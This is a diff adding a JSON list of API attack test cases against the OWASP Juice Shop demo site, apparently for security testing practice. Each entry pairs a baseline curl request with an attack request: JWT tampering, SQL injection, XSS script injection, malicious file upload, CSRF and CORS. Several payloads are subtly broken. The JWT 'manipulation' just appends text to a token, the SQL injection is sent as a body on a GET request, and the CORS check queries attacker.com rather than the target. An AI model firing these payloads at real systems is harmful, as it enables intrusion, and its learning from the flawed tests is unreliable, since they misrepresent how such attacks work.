@@ -1,0 +1,44 @@
+ [
+  {
+    "attack_vector": "jwt_token_manipulation",
+    "test_scenario": "Check for JWT token manipulation vulnerabilities by modifying token algorithm or payload.",
+    "curl_baseline": "curl -X GET 'https://demo.owasp-juice.shop/api/user?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflTDkgSldJXWwK1V4PbZ7r3jNLhGAwZWxibFgo1TgYJRuhsAI",
+    "curl_payload": "curl -X GET 'https://demo.owasp-juice.shop/api/user?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im1vbWVudC5leGFtcGxlLWRvY2EiLCJpYXQiOjE1MTYyMzkwMDIyfQ.SflTDkgSldJXWwK1V4PbZ7r3jNLhGAwZWxibFgo1TgYJRuhsAI%20OR%20auth_data=eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflTDkgSldJXWwK1V4PbZ7r3jNLhGAwZWxibFgo1TgYJRuhsAI"
+  },
+  {
+    "attack_vector": "sql_injection",
+    "test_scenario": "Test for SQL injection vulnerabilities in API queries by modifying input parameters.",
+    "curl_baseline": "curl -X GET 'https://demo.owasp-juice.shop/api/users?page=1'",
+    "curl_payload": "curl -X GET 'https://demo.owasp-juice.shop/api/users?page=1' --header 'Accept: application/json;charset=UTF-8' --header 'Content-Type: application/json' --data-binary '\x00page=\' OR 1=1;--'"
+  },
+  {
+    "attack_vector": "api_versioning",
+    "test_scenario": "Attempt to enumerate available API endpoints and versions by testing various URL structures.",
+    "curl_baseline": "curl -X GET 'https://demo.owasp-juice.shop/api/v1/users'",
+    "curl_payload": "curl -X GET 'https://demo.owasp-juice.shop/api/v2/users'"
+  },
+  {
+    "attack_vector": "csrf",
+    "test_scenario": "Attempt to perform CSRF attacks on API endpoints.",
+    "curl_baseline": "curl -X POST 'https://demo.owasp-juice.shop/api/users' --data 'name=TestUser&email=testuser@example.com'",
+    "curl_payload": "curl -X POST \'<CSRF_VULNERABLE_SITE>/create_post?csrf_token=<VULNERABLE_TOKEN>\' --data 'name=Attacker&email=attacker@example.com'"
+  },
+  {
+    "attack_vector": "xss",
+    "test_scenario": "Test for XSS vulnerabilities in API responses and error messages.",
+    "curl_baseline": "curl -X GET 'https://demo.owasp-juice.shop/api/users?page=1'",
+    "curl_payload": "curl -X GET 'https://demo.owasp-juice.shop/api/users?page=<script>alert('XSS')</script>'"
+  },
+  {
+    "attack_vector": "file_upload",
+    "test_scenario": "Attempt to upload malicious files through API endpoints.",
+    "curl_baseline": "curl -X POST 'https://demo.owasp-juice.shop/api/upload?filename=sample.txt' --data-binary '@sample.txt'",
+    "curl_payload": "curl -X POST 'https://demo.owasp-juice.shop/api/upload?filename=sample.txt;type=application/octet-stream' --data-binary '@malicious_file'"
+  },
+  {
+    "attack_vector": "cors",
+    "test_scenario": "Check for CORS misconfigurations in API endpoints.",
+    "curl_baseline": "curl -X GET 'https://demo.owasp-juice.shop/api/users?page=1'",
+    "curl_payload": "curl -X GET 'https://attacker.com/api/users' --header 'Origin: https://demo.owasp-juice.shop'"
+  }
+]
